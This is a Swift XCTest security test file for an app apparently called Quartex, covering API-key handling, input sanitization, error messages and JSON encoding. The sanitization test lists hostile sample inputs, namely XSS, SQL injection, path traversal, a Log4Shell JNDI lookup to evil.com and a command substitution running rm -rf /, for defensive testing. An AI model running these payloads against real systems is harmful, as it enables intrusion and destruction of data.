import XCTest
@testable import Quartex

class SecurityTests: XCTestCase {
    
    func testAPIKeyNotHardcoded() {
        // Ensure no hardcoded API keys in production code
        let testApiKey = "test_api_key_123"
        
        // This test ensures we're not accidentally using test keys in production
        XCTAssertNotEqual(testApiKey, "sk-")  // Real API keys start with sk-
        XCTAssertTrue(testApiKey.contains("test"))  // Test keys should contain "test"
    }
    
    func testInputSanitization() {
        let maliciousInputs = [
            "<script>alert('xss')</script>",
            "'; DROP TABLE users; --",
            "../../../etc/passwd",
            "${jndi:ldap://evil.com/payload}",
            "$(rm -rf /)"
        ]
        
        for input in maliciousInputs {
            let sanitized = input.sanitized()
            
            // Basic sanitization should at least trim whitespace
            XCTAssertEqual(sanitized, input.trimmingCharacters(in: .whitespacesAndNewlines))
            
            // Test that we can create messages with potentially malicious content
            // (The actual filtering should happen at a higher level)
            let message = LLMMessage(role: "user", content: sanitized)
            XCTAssertEqual(message.content, sanitized)
        }
    }
    
    func testErrorMessageSafety() {
        let errors: [AIAgentError] = [
            .noAPIKey,
            .noData,
            .invalidResponse,
            .networkError(URLError(.notConnectedToInternet)),
            .fileOperationFailed("test path"),
            .configurationError("test config"),
            .unsupportedFileType("exe"),
            .invalidInput("malicious input")
        ]
        
        for error in errors {
            let description = error.errorDescription
            let suggestion = error.recoverySuggestion
            
            // Error messages should not be empty
            XCTAssertNotNil(description)
            XCTAssertFalse(description?.isEmpty ?? true)
            
            // Recovery suggestions should exist for most errors
            if case .noData = error {
                // noData might not have recovery suggestion
            } else {
                XCTAssertNotNil(suggestion)
            }
        }
    }
    
    func testConfigurationSecurity() {
        // Test that configuration doesn't expose sensitive data
        let config = Configuration.shared
        
        // API key access should be available but we can't test the actual key here
        // since it might be from environment
        XCTAssertNotNil(config.apiKey)  // Should return something, even if empty
        
        // Endpoint should be a valid URL format
        let endpoint = config.llmEndpoint
        XCTAssertTrue(endpoint.hasPrefix("http://") || endpoint.hasPrefix("https://"))
    }
    
    func testJSONSafety() {
        // Test that JSON serialization doesn't expose internal data
        let testMessage = LLMMessage(role: "user", content: "test")
        
        do {
            let encoder = JSONEncoder()
            let data = try encoder.encode(testMessage)
            let jsonString = String(data: data, encoding: .utf8)
            
            // JSON should only contain expected fields
            XCTAssertTrue(jsonString?.contains("role") ?? false)
            XCTAssertTrue(jsonString?.contains("content") ?? false)
            XCTAssertTrue(jsonString?.contains("test") ?? false)
            
            // Should not contain internal Swift metadata
            XCTAssertFalse(jsonString?.contains("$__lazy_storage") ?? true)
            XCTAssertFalse(jsonString?.contains("__") ?? true)
        } catch {
            XCTFail("JSON encoding should not fail: \(error)")
        }
    }
    
    func testMemoryLeakPrevention() {
        // Test that creating many objects doesn't cause obvious memory issues
        var conversations: [Conversation] = []
        
        for i in 1...100 {
            var conversation = Conversation()
            conversation.addUserMessage("Test message \(i)")
            conversation.addAssistantMessage("Response \(i)")
            conversations.append(conversation)
        }
        
        XCTAssertEqual(conversations.count, 100)
        
        // Clear references
        conversations.removeAll()
        XCTAssertTrue(conversations.isEmpty)
    }
    
    func testValidation() {
        // Test various validation scenarios
        let validInputTypes: [InputType] = [.text, .audio, .video, .file, .image]
        
        for inputType in validInputTypes {
            let testData = "test".data(using: .utf8)!
            let event = InputEvent(type: inputType, content: testData)
            
            XCTAssertEqual(event.type, inputType)
            XCTAssertEqual(event.content, testData)
            XCTAssertNotNil(event.id)
            XCTAssertNotNil(event.timestamp)
        }
    }
}